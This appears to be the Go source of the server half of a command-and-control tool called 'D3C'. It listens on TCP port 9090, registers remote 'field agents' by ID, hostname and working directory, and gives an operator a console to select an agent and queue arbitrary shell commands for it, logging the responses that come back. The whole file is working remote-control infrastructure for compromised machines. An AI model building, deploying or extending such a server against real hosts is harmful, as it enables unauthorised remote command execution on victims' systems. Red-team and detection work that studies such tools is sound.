package main

import (
	"bufio"
	"encoding/gob"
	"global"
	"helpers"
	"log"
	"net"
	"os"
)

var (
	fieldAgents   = []global.Message{}
	selectedAgent = ""
)

func main() {
	log.Println("Execution started")

	go startListener("9090")

	cliHandler()
}

func showHandler(command []string) {
	if len(command) > 1 {
		switch command[1] {
		case "agents":
			for _, v := range fieldAgents {
				println("ID Agent: " + v.AgentID + " -> " + v.AgentHostname + "@" + v.AgentCWD)
			}
		default:
			log.Println("The selected parameter does not exist")
		}
	}
}

func selectHandler(command []string) {
	if len(command) > 1 {
		if agentRegistration(command[1]) {
			selectedAgent = command[1]
		} else {
			log.Println("The selected agent is not in the field.")
			log.Println("To list agents in the field type: show agents")
		}
	} else {
		selectedAgent = ""
	}
}

func cliHandler() {
	for {
		if selectedAgent != "" {
			print(selectedAgent + "@D3C# ")
		} else {
			print("D3C> ")
		}

		reader := bufio.NewReader(os.Stdin)
		fullCommand, _ := reader.ReadString('\n')

		separateCommand := helpers.CommandsSplit(fullCommand)
		baseCommando := separateCommand[0]

		if len(baseCommando) > 0 {
			switch baseCommando {
			case "show":
				showHandler(separateCommand)
			case "select":
				selectHandler(separateCommand)
			default:
				if selectedAgent != "" {
					command := &global.Command{}
					command.Request = fullCommand

					for i, v := range fieldAgents {
						if v.AgentID == selectedAgent {
							// ADD request commando for this agent
							fieldAgents[i].Commands = append(fieldAgents[i].Commands, *command)
						}
					}

				} else {
					log.Println("Non-existent command!")
				}
			}
		}
	}
}

func agentRegistration(agentID string) (registered bool) {
	registered = false

	for _, v := range fieldAgents {
		if v.AgentID == agentID {
			registered = true
		}
	}

	return registered
}

func commandResponse(message global.Message) (contains bool) {
	contains = false

	for _, v := range message.Commands {
		if len(v.Response) > 0 {
			contains = true
		}
	}

	return contains
}

func agentFieldPosition(agentID string) (position int) {
	for i, v := range fieldAgents {
		if v.AgentID == agentID {
			position = i
		}
	}

	return position
}

func startListener(port string) {
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)

	if err != nil {
		log.Fatal("Error starting listener: ", err.Error())
	} else {

		for {
			channel, e := listener.Accept()
			defer channel.Close()

			if e != nil {
				log.Println("Error on a new channel: ", e.Error())
			} else {
				message := &global.Message{}

				gob.NewDecoder(channel).Decode(message)

				// Agent registration verification
				if agentRegistration(message.AgentID) {

					if commandResponse(*message) {
						log.Println("Agent Message: ", message.AgentID)

						//Print response
						for _, v := range message.Commands {
							log.Println("Request: ", v.Request)
							log.Println("Response: ", v.Response)
						}
					}
				} else {
					log.Println("New connection: ", channel.RemoteAddr().String())
					log.Println("Agent ID: ", message.AgentID)

					fieldAgents = append(fieldAgents, *message)
				}

				// Send queue commands to agent
				gob.NewEncoder(channel).Encode(fieldAgents[agentFieldPosition(message.AgentID)])
			}
		}
	}
}
